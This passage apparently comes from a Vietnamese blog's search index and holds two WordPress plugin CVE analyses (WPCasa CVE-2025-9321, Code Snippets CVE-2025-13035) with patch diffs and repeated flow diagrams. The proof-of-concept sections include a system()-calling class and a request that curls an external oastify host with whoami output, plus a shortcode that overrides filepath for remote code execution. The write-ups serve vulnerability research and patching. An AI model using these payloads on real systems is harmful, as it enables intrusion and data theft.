ƒë√≥ k·∫øt th√∫c b·∫±ng die('1'). V·∫•n ƒë·ªÅ l√† d·ªØ li·ªáu t·ª´ URL kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t, d·ªÖ b·ªã l·ª£i d·ª•ng ƒë·ªÉ th·ª±c thi m√£ tr√°i ph√©p. B·∫£n v√° (v1.4.2): public function api_requests() { global $wp; // 1) Preferred getter. $raw = get_query_var( 'wpsight-api' ); // 2) Fallback: directly from $wp-\u003equery_vars. if ( empty( $raw ) \u0026\u0026 isset( $wp-\u003equery_vars['wpsight-api'] ) ) { $raw = $wp-\u003equery_vars['wpsight-api']; } // 3) Last resort: direct $_GET. if ( empty( $raw ) \u0026\u0026 ! empty( $_GET['wpsight-api'] ) ) { $raw = sanitize_text_field( wp_unslash( $_GET['wpsight-api'] ) ); } // No request found ‚Üí exit early. if ( empty( $raw ) ) { return; } // Sanitize to a valid key. $api = sanitize_key( $raw ); if ( empty( $api ) ) { return; } /** * Build allow-list of allowed API endpoints. * * IMPORTANT: Replace or extend this list in your theme or plugin * using the 'wpsight_api_allowed_endpoints' filter. * * Example: * * add_filter( 'wpsight_api_allowed_endpoints', function( $allowed ) { * $allowed['ping'] = array( 'class' =\u003e null ); * return $allowed; * } ); */ $allowed = apply_filters( 'wpsight_api_allowed_endpoints', array() ); // If API is not allowed, block access. if ( ! isset( $allowed[ $api ] ) ) { wp_die( sprintf( /* translators: %s: API endpoint slug */ esc_html__( 'Endpoint \"%s\" not allowed.', 'wpcasa' ), $api ), esc_html__( 'Forbidden', 'wpcasa' ), array( 'response' =\u003e 403 ) ); } // Start output buffering. ob_start(); // Optional: safe class instantiation if explicitly allowed. if ( ! empty( $allowed[ $api ]['class'] ) \u0026\u0026 class_exists( $allowed[ $api ]['class'] ) ) { new $allowed[ $api ]['class'](); } /** * Trigger API action hook. * * Example usage: * add_action( 'wpsight_api_ping', function() { * echo 'pong'; * } ); */ do_action( 'wpsight_api_' . $api ); // In development mode, allow buffer output for easier testing. if ( defined( 'WP_DEBUG' ) \u0026\u0026 WP_DEBUG ) { ob_end_flush(); } else { ob_end_clean(); } // Maintain old behaviour for backward compatibility. die( '1' ); } S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rB·∫£n v√° ƒë√£: L·∫•y d·ªØ li·ªáu theo th·ª© t·ª±: get_query_var ‚Üí $wp-\u003equery_vars ‚Üí $_GET. D√πng sanitize_key ƒë·ªÉ ƒë·∫£m b·∫£o d·ªØ li·ªáu h·ª£p l·ªá. C√≥ danh s√°ch cho ph√©p (allow-list) qua filter wpsight_api_allowed_endpoints. N·∫øu endpoint kh√¥ng n·∫±m trong danh s√°ch th√¨ ch·∫∑n truy c·∫≠p (403). Ch·ªâ t·∫°o class n·∫øu ƒë∆∞·ª£c khai b√°o r√µ r√†ng trong danh s√°ch. C√≥ h·ªó tr·ª£ ch·∫ø ƒë·ªô debug ƒë·ªÉ ki·ªÉm th·ª≠ d·ªÖ d√†ng. An to√†n h∆°n, h·∫°n ch·∫ø vi·ªác th·ª±c thi m√£ tr√°i ph√©p. ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt action hook: add_action( 'parse_request', array( $this, 'api_requests'), 0 ); parse_request: hook ƒë∆∞·ª£c k√≠ch ho·∫°t r·∫•t s·ªõm, ngay sau khi WordPress ph√¢n t√≠ch URL v√† t·∫°o ƒë·ªëi t∆∞·ª£ng $wp. ƒê√¢y l√† l√∫c c√°c tham s·ªë query ƒë∆∞·ª£c x·ª≠ l√Ω. =\u003e Ngay khi WordPress ph√¢n t√≠ch request, callback api_requests c·ªßa s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω c√°c y√™u c·∫ßu. ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() ‚Üí constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed ‚Üí attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() ‚Üí constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed ‚Üí attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() ‚Üí constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed ‚Üí attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] graph TD A[\"Attacker sends request /?wpsight-api=payload\"] --\u003e B[\"parse_request hook triggers api_requests()\"] B --\u003e C[\"Read user input $_GET['wpsight-api']\"] C --\u003e D[\"$api = strtolower(esc_attr(...))\"] D --\u003e E{\"class_exists($api)?\"} E -- Yes --\u003e F[\"Instantiate arbitrary class new $api() ‚Üí constructor executes\"] E -- No --\u003e G[\"Skip class creation\"] F --\u003e H[\"Trigger dynamic hook do_action('wpsight_api_' . $api)\"] G --\u003e H H --\u003e I{\"Hook handler exists?\"} I -- Yes --\u003e J[\"Callback executed ‚Üí attacker-controlled code\"] I -- No --\u003e K[\"No action, but die('1') still called\"] J --\u003e L[\"RCE achieved\"] K --\u003e L L --\u003e Z[\"End\"] ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class evil v√† ƒë·∫∑t trong wp-config.php ƒë·ªÉ test: class evil { public $command = \"ls /\"; public function __construct() { $this-\u003ecommand = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : $this-\u003ecommand; die(system($this-\u003ecommand)); } } G·ª≠i request v·ªõi payload: GET /?wpsight-api=evil\u0026cmd=curl+http://n9xe0s2jxjyt8klg2lxcj4b6jxpode13.oastify.com/?leaked=$(whoami) HTTP/1.1 Host: localhost K·∫øt qu·∫£\r","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªói xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω tham s·ªë wpsight-api kh√¥ng an to√†n, cho ph√©p g·ªçi class v√† hook t√πy √Ω, d·∫´n ƒë·∫øn RCE. B·∫£n v√° th√™m ki·ªÉm so√°t ƒë·∫ßu v√†o v√† gi·ªõi h·∫°n endpoint ƒë·ªÉ ch·∫∑n khai th√°c. ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rD·ªØ li·ªáu URL c·∫ßn ƒë∆∞·ª£c gi·ªõi h·∫°n b·∫±ng allow‚Äëlist. Hook v√† class ƒë·ªông ph·∫£i ƒë∆∞·ª£c b·∫£o v·ªá kh·ªèi input ng∆∞·ªùi d√πng. Ki·ªÉm so√°t ƒë·∫ßu v√†o sai c√≥ th·ªÉ d·∫´n ƒë·∫øn RCE nghi√™m tr·ªçng. ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rRemote Code Execution (RCE) WordPress WPCasa Plugin \u003c= 1.4.1 is vulnerable to PHP Object Injection ","date":"2025-11-28","objectID":"/vi/posts/2025-11-28-cve-2025-9321/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9321 Analysis \u0026 POC","uri":"/vi/posts/2025-11-28-cve-2025-9321/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Code Snippets Plugin.","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Code Snippets cho WordPress t·ªìn t·∫°i l·ªó h·ªïng PHP Code Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, 3.9.1. Nguy√™n nh√¢n l√† do plugin s·ª≠ d·ª•ng extract() tr√™n shortcode attributes do attacker ki·ªÉm so√°t b√™n trong method evaluate_shortcode_from_flat_file, c√≥ th·ªÉ ƒë∆∞·ª£c d√πng ƒë·ªÉ ghi ƒë√® bi·∫øn $filepath v√† sau ƒë√≥ truy·ªÅn v√†o require_once. ƒêi·ªÅu n√†y cho ph√©p attacker ƒë√£ x√°c th·ª±c, v·ªõi quy·ªÅn Contributor tr·ªü l√™n, th·ª±c thi t√πy √Ω PHP code tr√™n server th√¥ng qua shortcode [code_snippet] b·∫±ng c√°ch s·ª≠ d·ª•ng PHP filter chains n·∫øu h·ªç c√≥ th·ªÉ l·ª´a administrator b·∫≠t t√πy ch·ªçn ‚ÄúEnable file-based execution‚Äù v√† t·∫°o √≠t nh·∫•t m·ªôt Content snippet ƒëang ho·∫°t ƒë·ªông. CVE ID: CVE-2025-13035 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 3.9.1 Patched Versions: 3.9.2 CVSS severity: Medium (8.5) Required Privilege: Contributor Product: WordPress Code Snippets Plugin ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Code Snippets: 3.9.1 ‚Äì vulnerable 3.9.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n l·ªói (v3.9.1): private function evaluate_shortcode_from_flat_file( $filepath, array $atts ): string { ob_start(); ( function( $atts ) use ( $filepath ) { /** * Avoiding extract is typically recommended, however in this situation we want to make it easy for snippet * authors to use custom attributes. * * @phpcs:disable WordPress.PHP.DontExtract.extract_extract */ extract( $atts ); require_once $filepath; } )( $atts ); return ob_get_clean(); } Trong h√†m evaluate_shortcode_from_flat_file, m·ªôt anonymous function ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a v√† g·ªçi ngay l·∫≠p t·ª©c (IIFE). H√†m n√†y nh·∫≠n tham s·ªë $atts (m·∫£ng c√°c attribute c·ªßa shortcode) v√† s·ª≠ d·ª•ng th√™m bi·∫øn $filepath t·ª´ b√™n ngo√†i th√¥ng qua use ($filepath). L·ªánh extract($atts) s·∫Ω tr√≠ch xu·∫•t c√°c ph·∫ßn t·ª≠ trong m·∫£ng $atts th√†nh bi·∫øn ri√™ng l·∫ª trong symbol table c·ªßa scope hi·ªán t·∫°i. V√≠ d·ª•: $atts = ['color' =\u003e 'blue', 'size' =\u003e 'large']; extract($atts); // B√¢y gi·ªù c√≥ $color = 'blue', $size = 'large' V·ªÅ m·∫∑t n·ªôi b·ªô, PHP qu·∫£n l√Ω bi·∫øn th√¥ng qua zval container: Tr√≠ch d·∫´n\rA PHP variable is stored in a container called a ‚Äúzval‚Äù. A zval container contains, besides the variable‚Äôs type and value, two additional bits of information. The first is called ‚Äúis_ref‚Äù and is a boolean value indicating whether or not the variable is part of a ‚Äúreference set‚Äù. With this bit, PHP‚Äôs engine knows how to differentiate between normal variables and references. Since PHP allows user-land references, as created by the \u0026 operator, a zval container also has an internal reference counting mechanism to optimize memory usage. This second piece of additional information, called ‚Äúrefcount‚Äù, contains how many variable names (also called symbols) point to this one zval container. All symbols are stored in a symbol table, of which there is one per scope. There is a scope for the main script (i.e., the one requested through the browser), as well as one for every function or method. Khi extract() ch·∫°y: M·ªói ph·∫ßn t·ª≠ trong $atts ƒë∆∞·ª£c √°nh x·∫° th√†nh m·ªôt bi·∫øn m·ªõi. C√°c bi·∫øn n√†y tr·ªè ƒë·∫øn c√πng m·ªôt zval v·ªõi gi√° tr·ªã trong m·∫£ng. ƒêi·ªÅu n√†y l√†m tƒÉng refcount (s·ªë l∆∞·ª£ng t√™n bi·∫øn c√πng tham chi·∫øu ƒë·∫øn m·ªôt gi√° tr·ªã). Khi scope k·∫øt th√∫c, symbol table b·ªã h·ªßy, refcount gi·∫£m xu·ªëng v√† b·ªô nh·ªõ ƒë∆∞·ª£c gi·∫£i ph√≥ng. L·ªói\rXung ƒë·ªôt t√™n bi·∫øn: N·∫øu $atts ch·ª©a key tr√πng v·ªõi bi·∫øn ƒë√£ t·ªìn t·∫°i trong scope (v√≠ d·ª• \"filepath\"), th√¨ bi·∫øn ƒë√≥ s·∫Ω b·ªã ghi ƒë√®. $atts = ['filepath' =\u003e '/tmp/malicious.php']; extract($atts); require_once $filepath; // gi·ªù s·∫Ω n·∫°p file t·ª´ $atts, kh√¥ng ph·∫£i file g·ªëc ƒê√¢y ch√≠nh l√† nguy√™n nh√¢n g√¢y ra l·ªó h·ªïng: attacker c√≥ th·ªÉ ch√®n gi√° tr·ªã \"filepath\" ƒë·ªÉ ƒëi·ªÅu khi·ªÉn file ƒë∆∞·ª£c require_once. B·∫£n v√° (v3.9.2): S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\rTrong b·∫£n v√°, h√†m extract() ƒë√£ ƒë∆∞·ª£c b·ªï sung option EXTR_SKIP. T√πy ch·ªçn n√†y ƒë·∫£m b·∫£o r·∫±ng n·∫øu $atts c√≥ key tr√πng v·ªõi bi·∫øn ƒë√£ t·ªìn t·∫°i, bi·∫øn g·ªëc s·∫Ω kh√¥ng b·ªã ghi ƒë√®. Nh·ªù ƒë√≥, $filepath ƒë∆∞·ª£c truy·ªÅn t·ª´ b√™n ngo√†i v·∫´n gi·ªØ nguy√™n gi√° tr·ªã an to√†n, lo·∫°i b·ªè nguy c∆° b·ªã thay th·∫ø b·ªüi d·ªØ li·ªáu t·ª´ $atts. ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rPlugin ƒë√£ ƒëƒÉng k√Ω m·ªôt shortcode: public const CONTENT_SHORTCODE = 'code_snippet'; add_shortcode( self::CONTENT_SHORTCODE, [ $this, 'render_content_shortcode' ] ); Khi shortcode n√†y xu·∫•t hi·ªán trong n·ªôi dung c·ªßa post/page, WordPress s·∫Ω g·ªçi callback render_content_shortcode: public function render_content_shortcode( array $atts ): string { $atts = $this-\u003econvert_boolean_attribute_flags( $atts, [ 'network', 'php', 'format', 'shortcodes', 'debug' ] ); $original_atts = $atts; $atts = shortcode_atts( [ 'id' =\u003e 0, 'snippet_id' =\u003e 0, 'network' =\u003e false, 'php' =\u003e false, 'format' =\u003e false, 'shortcodes' =\u003e false, 'debug' =\u003e false, ], $atts, self::CONTENT_SHORTCODE ); $id = 0 !== intval( $atts['snippet_id'] ) ? intval( $atts['snippet_id'] ) : intval( $atts['id'] ); if ( ! $id ) { return $this-\u003einvalid_id_warning( $id ); } $snippet = $this-\u003eget_snippet( $id, (bool) $atts['network'], 'html' ); // Render the source code if this is not a shortcode snippet. if ( 'content' !== $snippet-\u003escope ) { return $snippet-\u003eid ? $this-\u003erender_snippet_source( $snippet ) : $this-\u003einvalid_id_warning( $snippet-\u003eid ); } ... $content = $this-\u003eevaluate_shortcode_content( $snippet, $original_atts ); ... } H√†m t·∫°o ra m·ªôt ƒë·ªëi t∆∞·ª£ng Snippet b·∫±ng c√°ch g·ªçi ph∆∞∆°ng th·ª©c get_snippet. Ph∆∞∆°ng th·ª©c nh·∫≠n v√†o ba tham s·ªë: ID c·ªßa snippet, gi√° tr·ªã boolean cho bi·∫øt c√≥ s·ª≠ d·ª•ng ch·∫ø ƒë·ªô network hay kh√¥ng, v√† ƒë·ªãnh d·∫°ng mong mu·ªën (html). K·∫øt qu·∫£ tr·∫£ v·ªÅ l√† m·ªôt ƒë·ªëi t∆∞·ª£ng Snippet ch·ª©a to√†n b·ªô th√¥ng tin c·∫ßn thi·∫øt ƒë·ªÉ ti·∫øp t·ª•c x·ª≠ l√Ω. Ti·∫øp theo, h√†m ki·ªÉm tra ph·∫°m vi (scope) c·ªßa snippet. N·∫øu snippet kh√¥ng thu·ªôc lo·∫°i content (html) Content khi t·∫°o Snippet\rplugin s·∫Ω kh√¥ng x·ª≠ l√Ω n·ªôi dung m√† thay v√†o ƒë√≥ tr·∫£ v·ªÅ ph·∫ßn m√£ ngu·ªìn c·ªßa snippet. H√†m evaluate_shortcode_content() ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω n·ªôi dung shortcode: protected function evaluate_shortcode_content( Snippet $snippet, array $atts ): string { if ( empty( $atts['php'] ) ) { return $snippet-\u003ecode; } if ( ! Snippet_Files::is_active() ) { return $this-\u003eevaluate_shortcode_from_db( $snippet, $atts ); } $network = DB::validate_network_param( $snippet-\u003enetwork ); $table_name = Snippet_Files::get_hashed_table_name( code_snippets()-\u003edb-\u003eget_table_name( $network ) ); $filepath = $this-\u003ebuild_snippet_flat_file_path( $table_name, $snippet ); return file_exists( $filepath ) ? $this-\u003eevaluate_shortcode_from_flat_file( $filepath, $atts ) : $this-\u003eevaluate_shortcode_from_db( $snippet, $atts ); } H√†m ki·ªÉm tra xem thu·ªôc t√≠nh php c√≥ t·ªìn t·∫°i hay kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ m√£ ngu·ªìn g·ªëc c·ªßa snippet m√† kh√¥ng th·ª±c thi. N·∫øu thu·ªôc t√≠nh php t·ªìn t·∫°i nh∆∞ng file l∆∞u tr·ªØ ch∆∞a t·ªìn t·∫°i, h√†m chuy·ªÉn sang ph∆∞∆°ng th·ª©c x·ª≠ l√Ω tr·ª±c ti·∫øp t·ª´ c∆° s·ªü d·ªØ li·ªáu. File l∆∞u tr·ªØ ƒë∆∞·ª£c khai b√°o: private const ENABLED_FLAG_FILE = 'flat-files-enabled.flag'; ƒê·ªÉ h√†m kh√¥ng return ·ªü ƒë√¢y, ta ph·∫£i b·∫≠t option Enable file-based execution trong admin panel: Enable file-based execution\rKhi ƒë√≥ file l∆∞u tr·ªØ ƒë∆∞·ª£c t·∫°o n·∫±m trong wp-content/code-snippets flat-files-enabled.flag ƒë∆∞·ª£c t·∫°o\rKhi file ƒë√£ t·ªìn t·∫°i, h√†m ti·∫øn h√†nh x√°c ƒë·ªãnh th√¥ng tin m·∫°ng c·ªßa snippet, l·∫•y t√™n b·∫£ng ƒë√£ ƒë∆∞·ª£c bƒÉm (hash) v√† x√¢y d·ª±ng ƒë∆∞·ªùng d·∫´n ƒë·∫øn file ch·ª©a n·ªôi dung c·ªßa snippet g√°n v√†o $filepath. N·∫øu $filepath t·ªìn t·∫°i h√†m g·ªçi ƒë·∫øn evaluate_shortcode_from_flat_file( $filepath, $atts ) n∆°i x·∫£y ra l·ªó h·ªïng. Th√¥ng tin\rL·ªï h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi ƒë·∫∑c quy·ªÅn Contributor v√¨ ƒë√¢y l√† ƒë·∫∑c quy·ªÅn th·∫•p nh·∫•t ƒë·ªÉ ch√®n shortcode v√†o post ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"]\rB --\u003e C[\"convert_boolean_attribute_flags()\"]\rC --\u003e D[\"shortcode_atts(): merge defaults into $atts\"]\rD --\u003e E[\"Determine snippet_id ‚Üí if invalid ‚Üí invalid_id_warning()\"]\rE --\u003e F[\"get_snippet(id, network, 'html') ‚Üí create Snippet object\"]\rF --\u003e G{\"snippet.scope == 'content'?\"}\rG -- No --\u003e H[\"render_snippet_source()\"]\rH --\u003e Z[\"End\"]\rG -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"]\rI --\u003e J{\"original_atts['php'] enabled?\"}\rJ -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z\rJ -- Yes --\u003e L{\"Snippet_Files::is_active()?\"}\rL -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z\rL -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"]\rN --\u003e O{\"Does file exist?\"}\rO -- No --\u003e M\rO -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"]\rP --\u003e Q[\"extract(atts) inside IIFE\"]\rQ --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"}\rR -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z\rR -- Yes --\u003e T[\"Internal variable overwritten ‚Üí filepath replaced\"]\rT --\u003e U[\"require_once attacker-controlled file\"]\rU --\u003e V[\"RCE achieved\"]\rV --\u003e Z\rgraph TD\rA[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"]\rB --\u003e C[\"convert_boolean_attribute_flags()\"]\rC --\u003e D[\"shortcode_atts(): merge defaults into $atts\"]\rD --\u003e E[\"Determine snippet_id ‚Üí if invalid ‚Üí invalid_id_warning()\"]\rE --\u003e F[\"get_snippet(id, network, 'html') ‚Üí create Snippet object\"]\rF --\u003e G{\"snippet.scope == 'content'?\"}\rG -- No --\u003e H[\"render_snippet_source()\"]\rH --\u003e Z[\"End\"]\rG -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"]\rI --\u003e J{\"original_atts['php'] enabled?\"}\rJ -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z\rJ -- Yes --\u003e L{\"Snippet_Files::is_active()?\"}\rL -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z\rL -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"]\rN --\u003e O{\"Does file exist?\"}\rO -- No --\u003e M\rO -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"]\rP --\u003e Q[\"extract(atts) inside IIFE\"]\rQ --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"}\rR -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z\rR -- Yes --\u003e T[\"Internal variable overwritten ‚Üí filepath replaced\"]\rT --\u003e U[\"require_once attacker-controlled file\"]\rU --\u003e V[\"RCE achieved\"]\rV --\u003e Z\rgraph TD\rA[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"]\rB --\u003e C[\"convert_boolean_attribute_flags()\"]\rC --\u003e D[\"shortcode_atts(): merge defaults into $atts\"]\rD --\u003e E[\"Determine snippet_id ‚Üí if invalid ‚Üí invalid_id_warning()\"]\rE --\u003e F[\"get_snippet(id, network, 'html') ‚Üí create Snippet object\"]\rF --\u003e G{\"snippet.scope == 'content'?\"}\rG -- No --\u003e H[\"render_snippet_source()\"]\rH --\u003e Z[\"End\"]\rG -- Yes --\u003e I[\"evaluate_shortcode_content(snippet, original_atts)\"]\rI --\u003e J{\"original_atts['php'] enabled?\"}\rJ -- No --\u003e K[\"Return snippet-\u003ecode\"] --\u003e Z\rJ -- Yes --\u003e L{\"Snippet_Files::is_active()?\"}\rL -- No --\u003e M[\"evaluate_shortcode_from_db()\"] --\u003e Z\rL -- Yes --\u003e N[\"Build file path: build_snippet_flat_file_path()\"]\rN --\u003e O{\"Does file exist?\"}\rO -- No --\u003e M\rO -- Yes --\u003e P[\"evaluate_shortcode_from_flat_file(filepath, atts)\"]\rP --\u003e Q[\"extract(atts) inside IIFE\"]\rQ --\u003e R{\"Do atts contain variable-name collisions (e.g., 'filepath')?\"}\rR -- No --\u003e S[\"require_once filepath (safe)\"] --\u003e Z\rR -- Yes --\u003e T[\"Internal variable overwritten ‚Üí filepath replaced\"]\rT --\u003e U[\"require_once attacker-controlled file\"]\rU --\u003e V[\"RCE achieved\"]\rV --\u003e Z\rgraph TD\rA[\"Contributor inserts [code_snippet] shortcode\"] --\u003e B[\"WordPress calls render_content_shortcode()\"]\rB --\u003e C[\"convert_boolean_attribute_flags()\"]\rC --\u003e D[\"shortcode_atts(): merge defaults into $atts\"]\rD --\u003e E[\"Determine snippet_id ‚Üí if invalid ‚Üí invalid_id_warning()\"]\rE --\u003e F[\"get_snippet(id, network, 'html') ‚Üí create Snippet object\"]\rF --\u003e G{\"snippet.scope == 'content'?\"}\rG -- No --\u003e H[\"render_snippet_source()\"]\rH --\u003e Z[\"End\"]\rG -- Yes --\u003e ","date":"2025-11-27","objectID":"/vi/posts/2025-11-27-cve-2025-13035/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-13035 Analysis \u0026 POC","uri":"/vi/posts/2025-11-27-cve-2025-13035/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rAdministrator b·∫≠t option Enable file-based execution Contributor ch√®n shortcode sau v√†o post v·ªõi snippet_id tr·ªè ƒë·∫øn Snippet c√≥ Snippet Type l√† HTML(content) [code_snippet snippet_id=4 php=1 filepath=/path/to/file] ·ªû ƒë√¢y attacker c√≥ to√†n quy·ªÅn ƒëi·ªÅu khi·ªÉn gi√° tr·ªã c·ªßa bi·∫øn filepath. ƒêi·ªÅu ƒë√≥ cho ph√©p s·ª≠ d·ª•ng c√°c PHP stream wrappers (ch·∫≥ng h·∫°n filter chain) ƒë·ªÉ d·∫´n t·ªõi th·ª±c thi m√£, v√¨: require_once ch·ªâ ki·ªÉm tra xem chu·ªói nh·∫≠n v√†o c√≥ ph·∫£i l√† m·ªôt ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá theo PHP hay kh√¥ng; n√≥ s·∫Ω c·ªë g·∫Øng n·∫°p b·∫•t k·ª≥ stream n√†o ƒë∆∞·ª£c cung c·∫•p m√† kh√¥ng gi·ªõi h·∫°n ·ªü file v·∫≠t l√Ω. PHP filter chain cho ph√©p bi·∫øn ƒë·ªïi n·ªôi dung stream v√† khi·∫øn PHP di·ªÖn gi·∫£i k·∫øt qu·∫£ cu·ªëi c√πng nh∆∞ m√£ PHP h·ª£p l·ªá. Khi n·ªôi dung sau filter ƒë∆∞·ª£c ƒë∆∞a v√†o require_once, PHP s·∫Ω th·ª±c thi n√≥. Nhi·ªÅu wrapper nh∆∞ http:// ho·∫∑c ftp:// b·ªã h·∫°n ch·∫ø 